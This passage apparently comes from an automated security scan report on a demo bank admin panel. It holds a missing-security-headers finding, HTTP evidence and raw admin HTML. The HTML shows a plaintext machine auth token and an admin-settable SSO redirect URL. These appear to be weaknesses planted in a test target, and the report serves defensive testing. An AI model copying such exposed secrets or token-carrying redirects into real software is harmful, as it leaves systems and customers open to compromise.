          <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
        </div>
        <span class="font-semibold">Admin</span>
      </div>
      <div class="w-10"></div>
    </div>

    <!-- Sidebar Overlay (mobile) -->
    <div id="sidebar-overlay" onclick="BankOfEdAdmin.App.toggleSidebar()" class="hidden fixed inset-0 z-30 bg-black/50 lg:hidden"></div>

    <!-- Sidebar -->
    <aside id="sidebar" class="fixed lg:static inset-y-0 left-0 z-40 w-64 bg-dark-900 text-white flex flex-col transform -translate-x-full lg:translate-x-0 transition-transform duration-200">
      <div class="p-6 flex items-center gap-3">
        <div class="w-10 h-10 bg-red-600 rounded-xl flex items-center justify-center flex-shrink-0">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
        </div>
        <div>
          <h2 class="font-bold text-lg">The Bank of Ed</h2>
          <p class="text-xs text-dark-400">Admin Panel</p>
        </div>
      </div>

      <nav class="flex-1 px-3 space-y-1 mt-2">
        <a href="#/customers" data-nav="customers" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
          <span>Customers</span>
        </a>
        <a href="#/accounts" data-nav="accounts" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
          <span>Accounts</span>
        </a>
        <a href="#/fx-rates" data-nav="fx-rates" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
          <span>FX Rates</span>
        </a>
        <a href="#/system" data-nav="system" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
          <span>System</span>
        </a>
      </nav>

      <div class="p-4 border-t border-dark-800">
        <div class="flex items-center gap-3 mb-3 px-2">
          <div class="w-9 h-9 bg-dark-700 rounded-full flex items-center justify-center text-sm font-semibold" id="sidebar-avatar">A</div>
          <div class="min-w-0">
            <p class="text-sm font-medium truncate" id="sidebar-admin-name">Admin</p>
          </div>
        </div>
        <button onclick="BankOfEdAdmin.App.logout()" class="w-full flex items-center gap-3 px-4 py-2.5 rounded-xl text-dark-400 hover:text-red-400 hover:bg-dark-800 transition-colors text-sm">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
          <span>Sign Out</span>
        </button>
      </div>
    </aside>

    <!-- Main Content -->
    <main class="flex-1 overflow-y-auto pt-14 lg:pt-0">
      <div class="p-4 sm:p-6 lg:p-8 max-w-7xl mx-auto">

        <!-- Customers List -->
        <section id="page-customers" class="hidden">
          <div class="flex items-center justify-between mb-6">
            <div>
              <h1 class="text-2xl font-bold text-dark-900">Customers</h1>
              <p class="text-dark-500 mt-1">Manage customer accounts</p>
            </div>
            <div class="flex items-center gap-3">
              <input type="text" id="customer-search" placeholder="Search..." class="px-4 py-2.5 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition text-sm w-48" onkeyup="BankOfEdAdmin.CustomersPage.handleSearch(event)">
            </div>
          </div>
          <div id="customers-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
          <div id="customers-pagination" class="mt-4 flex items-center justify-between"></div>
        </section>

        <!-- Customer Detail -->
        <section id="page-customer-detail" class="hidden">
          <a href="#/customers" class="inline-flex items-center gap-1 text-red-600 hover:text-red-700 text-sm font-medium mb-6">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
            Back to Customers
          </a>
          <div id="customer-detail-content"></div>
        </section>

        <!-- Accounts -->
        <section id="page-accounts" class="hidden">
          <div class="mb-6">
            <h1 class="text-2xl font-bold text-dark-900">All Accounts</h1>
            <p class="text-dark-500 mt-1">View and manage all bank accounts</p>
          </div>
          <div id="accounts-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
          <div id="accounts-pagination" class="mt-4 flex items-center justify-between"></div>
        </section>

        <!-- FX Rates -->
        <section id="page-fx-rates" class="hidden">
          <div class="flex items-center justify-between mb-6">
            <div>
              <h1 class="text-2xl font-bold text-dark-900">FX Rates</h1>
              <p class="text-dark-500 mt-1">Manage foreign exchange rates</p>
            </div>
            <button onclick="BankOfEdAdmin.FxRatesPage.showAddModal()" class="bg-red-600 hover:bg-red-700 text-white font-semibold px-5 py-2.5 rounded-xl transition-colors text-sm flex items-center gap-2">
              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"></path></svg>
              Add Rate
            </button>
          </div>
          <div id="fx-rates-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
        </section>

        <!-- System -->
        <section id="page-system" class="hidden">
          <div class="mb-6">
            <h1 class="text-2xl font-bold text-dark-900">System Management</h1>
            <p class="text-dark-500 mt-1">Integration settings, database operations and maintenance</p>
          </div>

          <!-- White-Label Partner Settings Card -->
          <div class="bg-white rounded-2xl shadow-sm border border-dark-100 p-6 sm:p-8 max-w-xl mb-6">
            <div class="flex items-center gap-3 mb-4">
              <div class="w-12 h-12 bg-amber-100 rounded-full flex items-center justify-center flex-shrink-0">
                <svg class="w-6 h-6 text-amber-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"></path></svg>
              </div>
              <div>
                <h2 class="text-xl font-bold text-dark-900">FACE Insurance Integration</h2>
                <p class="text-sm text-dark-500">Configure target URL for White-Label Insurance SSO</p>
              </div>
            </div>
            <form id="insurance-settings-form" onsubmit="BankOfEdAdmin.SystemPage.saveSettings(event)" class="space-y-4">
              <div>
                <label class="block text-sm font-medium text-dark-700 mb-1.5">FACE Insurance Base URL</label>
                <input type="url" id="setting-insurance-url" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition text-sm" placeholder="http://localhost:8001">
                <p class="text-xs text-dark-400 mt-1.5">When customers click Insurance, they will be redirected to this URL with an SSO assertion token.</p>
              </div>
              <div class="p-3.5 bg-dark-50 rounded-xl text-xs text-dark-600 space-y-1 font-mono">
                <div><span class="font-semibold text-dark-800">Merchant ID:</span> <span id="setting-merchant-id">faceinsurance</span></div>
                <div><span class="font-semibold text-dark-800">Settlement Account:</span> <span id="setting-merchant-account">062-001 88880001 (face@example.com)</span></div>
                <div><span class="font-semibold text-dark-800">Machine Auth Token:</span> <span id="setting-machine-token" class="text-dark-500">mch_face_insurance_secret_key_2026</span></div>
              </div>
              <button type="submit" id="save-settings-btn" class="bg-dark-900 hover:bg-dark-800 text-white font-semibold px-6 py-2.5 rounded-xl transition-colors text-sm flex items-center justify-center gap-2 disabled:opacity-50">
                <span>Save Settings</span>
                <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
              </button>
            </form>
          </div>

          <!-- Reset Database Card -->
          <div class="bg-white rounded-2xl shadow-sm border border-red-200 p-6 sm:p-8 max-w-xl">
            <div class="flex items-center gap-3 mb-4">
              <div class="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center flex-shrink-0">
                <svg class="w-6 h-6 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
              </div>
              <div>
                <h2 class="text-xl font-bold text-dark-900">Reset Database</h2>
                <p class="text-sm text-dark-500">Drop and recreate the entire database with seed data</p>
              </div>
            </div>
            <div class="bg-red-50 border border-red-200 rounded-xl p-4 mb-6">
              <p class="text-red-800 text-sm font-medium">Warning: This action is irreversible</p>
              <p class="text-red-600 text-xs mt-1">All customer data, accounts, and transactions will be permanently deleted and replaced with default seed data.</p>
            </div>
            <p class="text-sm text-dark-600 mb-3">Type <strong>RESET</strong> below to confirm:</p>
            <input type="text" id="reset-confirm-input" class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition font-mono tracking-widest text-center text-lg mb-4" placeholder="Type RESET">
            <button id="reset-btn" onclick="BankOfEdAdmin.SystemPage.handleReset()" class="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-3 rounded-xl transition-colors flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed">
              <span>Reset Database</span>
              <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
            </button>
          </div>
        </section>

      </div>
    </main>
  </div>

  <!-- Scripts -->
  <script src="js/utils.js"></script>
  <script src="js/api.js"></script>
  <script src="js/router.js"></script>
  <script src="js/pages/auth.js"></script>
  <script src="js/pages/customers.js"></script>
  <script src="js/pages/accounts.js"></script>
  <script src="js/pages/system.js"></script>
  <script src="js/pages/fx-rates.js"></script>
  <script src="js/app.js"></script>
</body>
</html>
```

### Validation Note
Not validated: severity 'info' is below the configured threshold 'low'.

## 49. Banking page lacks browser security headers

- Finding reference: URBN-076
- Severity: info
- OWASP: A05
- Source: Dynamic
- Validation: skipped
- Affected URL: http://localhost:8081/admin/#/customers/11
- CVSS: 0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:N)

### Description
The admin page response omits Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, and Referrer-Policy headers.

### Impact
The missing headers reduce browser-side protection against framing, content-type confusion, and script injection if another weakness exists.

### Likelihood
The configuration is confirmed, but these probes do not demonstrate a directly exploitable browser attack.

### Recommendation
Set an appropriate Content-Security-Policy, prevent unauthorized framing with frame-ancestors, add X-Content-Type-Options: nosniff, and define a restrictive Referrer-Policy.

### Evidence
```
The 200 response contains HTML but none of the listed browser security headers.

REQUEST:
GET http://localhost:8081/admin/#/customers/11
use_session: anonymous  Authorization: present
Cookies: none
{}

RESPONSE:
Status: 200
date: Tue, 08 Sep 2026 13:34:23 GMT
server: Apache/2.4.68 (Unix)
last-modified: Sun, 23 Aug 2026 12:34:31 GMT
etag: "4c9c-659b6175aa3c0"
accept-ranges: bytes
content-length: 19612
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>The Bank of Ed - Admin</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            dark: {
              50: '#f4f4f5', 100: '#e4e4e7', 200: '#d4d4d8', 300: '#a1a1aa',
              400: '#71717a', 500: '#52525b', 600: '#3f3f46', 700: '#27272a',
              800: '#18181b', 900: '#09090b', 950: '#030305'
            }
          },
          fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] }
        }
      }
    }
  </script>
  <link rel="stylesheet" href="css/app.css">
</head>
<body class="bg-dark-50 font-sans text-dark-800">

  <!-- Toast Container -->
  <div id="toast-container" class="fixed top-4 right-4 z-50 space-y-2"></div>

  <!-- Modal Overlay -->
  <div id="modal-overlay" class="hidden fixed inset-0 z-40 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4">
    <div id="modal-content" class="bg-white rounded-2xl shadow-2xl w-full max-w-md max-h-[90vh] overflow-y-auto"></div>
  </div>

  <!-- ===================== AUTH VIEW ===================== -->
  <div id="view-auth" class="hidden min-h-screen flex items-center justify-center bg-gradient-to-br from-dark-900 via-dark-800 to-dark-950 p-4">
    <div class="w-full max-w-md">
      <div class="text-center mb-8">
        <div class="inline-flex items-center gap-3">
          <div class="w-12 h-12 bg-red-600 rounded-xl flex items-center justify-center">
            <svg class="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
          </div>
          <h1 class="text-3xl font-bold text-white">The Bank of Ed</h1>
        </div>
        <p class="text-dark-400 mt-2">Administration Panel</p>
      </div>

      <div class="bg-white rounded-2xl shadow-2xl overflow-hidden p-8">
        <form id="login-form" onsubmit="BankOfEdAdmin.AuthPage.handleLogin(event)">
          <div class="space-y-5">
            <div>
              <label class="block text-sm font-medium text-dark-700 mb-1.5">Username</label>
              <input type="text" name="username" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition" placeholder="admin" autofocus>
            </div>
            <div>
              <label class="block text-sm font-medium text-dark-700 mb-1.5">Password</label>
              <input type="password" name="password" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition" placeholder="Enter password">
            </div>
          </div>
          <div id="login-errors" class="mt-4 text-sm text-red-600 hidden"></div>
          <button type="submit" class="w-full mt-6 bg-red-600 hover:bg-red-700 text-white font-semibold py-3 rounded-xl transition-colors flex items-center justify-center gap-2">
            <span>Sign In</span>
            <svg class="w-4 h-4 animate-spin hidden" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg>
          </button>
        </form>
      </div>
    </div>
  </div>

  <!-- ===================== APP SHELL ===================== -->
  <div id="app-shell" class="hidden flex h-screen overflow-hidden">

    <!-- Mobile Header -->
    <div class="lg:hidden fixed top-0 left-0 right-0 z-30 bg-dark-900 text-white flex items-center justify-between px-4 py-3">
      <button onclick="BankOfEdAdmin.App.toggleSidebar()" class="p-2 hover:bg-dark-800 rounded-lg">
        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
      </button>
      <div class="flex items-center gap-2">
        <div class="w-8 h-8 bg-red-600 rounded-lg flex items-center justify-center">
          <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
        </div>
        <span class="font-semibold">Admin</span>
      </div>
      <div class="w-10"></div>
    </div>

    <!-- Sidebar Overlay (mobile) -->
    <div id="sidebar-overlay" onclick="BankOfEdAdmin.App.toggleSidebar()" class="hidden fixed inset-0 z-30 bg-black/50 lg:hidden"></div>

    <!-- Sidebar -->
    <aside id="sidebar" class="fixed lg:static inset-y-0 left-0 z-40 w-64 bg-dark-900 text-white flex flex-col transform -translate-x-full lg:translate-x-0 transition-transform duration-200">
      <div class="p-6 flex items-center gap-3">
        <div class="w-10 h-10 bg-red-600 rounded-xl flex items-center justify-center flex-shrink-0">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
        </div>
        <div>
          <h2 class="font-bold text-lg">The Bank of Ed</h2>
          <p class="text-xs text-dark-400">Admin Panel</p>
        </div>
      </div>

      <nav class="flex-1 px-3 space-y-1 mt-2">
        <a href="#/customers" data-nav="customers" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
          <span>Customers</span>
        </a>
        <a href="#/accounts" data-nav="accounts" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
          <span>Accounts</span>
        </a>
        <a href="#/fx-rates" data-nav="fx-rates" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
          <span>FX Rates</span>
        </a>
        <a href="#/system" data-nav="system" class="nav-link flex items-center gap-3 px-4 py-3 rounded-xl text-dark-300 hover:text-white hover:bg-dark-800 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
          <span>System</span>
        </a>
      </nav>

      <div class="p-4 border-t border-dark-800">
        <div class="flex items-center gap-3 mb-3 px-2">
          <div class="w-9 h-9 bg-dark-700 rounded-full flex items-center justify-center text-sm font-semibold" id="sidebar-avatar">A</div>
          <div class="min-w-0">
            <p class="text-sm font-medium truncate" id="sidebar-admin-name">Admin</p>
          </div>
        </div>
        <button onclick="BankOfEdAdmin.App.logout()" class="w-full flex items-center gap-3 px-4 py-2.5 rounded-xl text-dark-400 hover:text-red-400 hover:bg-dark-800 transition-colors text-sm">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
          <span>Sign Out</span>
        </button>
      </div>
    </aside>

    <!-- Main Content -->
    <main class="flex-1 overflow-y-auto pt-14 lg:pt-0">
      <div class="p-4 sm:p-6 lg:p-8 max-w-7xl mx-auto">

        <!-- Customers List -->
        <section id="page-customers" class="hidden">
          <div class="flex items-center justify-between mb-6">
            <div>
              <h1 class="text-2xl font-bold text-dark-900">Customers</h1>
              <p class="text-dark-500 mt-1">Manage customer accounts</p>
            </div>
            <div class="flex items-center gap-3">
              <input type="text" id="customer-search" placeholder="Search..." class="px-4 py-2.5 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition text-sm w-48" onkeyup="BankOfEdAdmin.CustomersPage.handleSearch(event)">
            </div>
          </div>
          <div id="customers-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
          <div id="customers-pagination" class="mt-4 flex items-center justify-between"></div>
        </section>

        <!-- Customer Detail -->
        <section id="page-customer-detail" class="hidden">
          <a href="#/customers" class="inline-flex items-center gap-1 text-red-600 hover:text-red-700 text-sm font-medium mb-6">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
            Back to Customers
          </a>
          <div id="customer-detail-content"></div>
        </section>

        <!-- Accounts -->
        <section id="page-accounts" class="hidden">
          <div class="mb-6">
            <h1 class="text-2xl font-bold text-dark-900">All Accounts</h1>
            <p class="text-dark-500 mt-1">View and manage all bank accounts</p>
          </div>
          <div id="accounts-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
          <div id="accounts-pagination" class="mt-4 flex items-center justify-between"></div>
        </section>

        <!-- FX Rates -->
        <section id="page-fx-rates" class="hidden">
          <div class="flex items-center justify-between mb-6">
            <div>
              <h1 class="text-2xl font-bold text-dark-900">FX Rates</h1>
              <p class="text-dark-500 mt-1">Manage foreign exchange rates</p>
            </div>
            <button onclick="BankOfEdAdmin.FxRatesPage.showAddModal()" class="bg-red-600 hover:bg-red-700 text-white font-semibold px-5 py-2.5 rounded-xl transition-colors text-sm flex items-center gap-2">
              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"></path></svg>
              Add Rate
            </button>
          </div>
          <div id="fx-rates-table" class="bg-white rounded-2xl shadow-sm border border-dark-100 overflow-hidden"></div>
        </section>

        <!-- System -->
        <section id="page-system" class="hidden">
          <div class="mb-6">
            <h1 class="text-2xl font-bold text-dark-900">System Management</h1>
            <p class="text-dark-500 mt-1">Integration settings, database operations and maintenance</p>
          </div>

          <!-- White-Label Partner Settings Card -->
          <div class="bg-white rounded-2xl shadow-sm border border-dark-100 p-6 sm:p-8 max-w-xl mb-6">
            <div class="flex items-center gap-3 mb-4">
              <div class="w-12 h-12 bg-amber-100 rounded-full flex items-center justify-center flex-shrink-0">
                <svg class="w-6 h-6 text-amber-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"></path></svg>
              </div>
              <div>
                <h2 class="text-xl font-bold text-dark-900">FACE Insurance Integration</h2>
                <p class="text-sm text-dark-500">Configure target URL for White-Label Insurance SSO</p>
              </div>
            </div>
            <form id="insurance-settings-form" onsubmit="BankOfEdAdmin.SystemPage.saveSettings(event)" class="space-y-4">
              <div>
                <label class="block text-sm font-medium text-dark-700 mb-1.5">FACE Insurance Base URL</label>
                <input type="url" id="setting-insurance-url" required class="w-full px-4 py-3 rounded-xl border border-dark-200 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition text-sm" placeholder="http://localhost:8001">
                <p class="text-xs text-dark-400 mt-1.5">When customers click Insurance, they will be redirected to this URL with an SSO assertion token.</p>
              </div>
              <div class="p-3.5 bg-dark-50 rounded-xl text-xs text-dark-600 space-y-1 font-mono">
                <div><span class="font-semibold text-dark-800">Merchant ID:</span> <span id="setting-merchant-id">faceinsurance</span></div>
                <div><span class="font-semibold text-dark-800">Settlement Account:</span> <span id="setting-merchant-account">062-001 88880001 (face@example.com)</span></div>
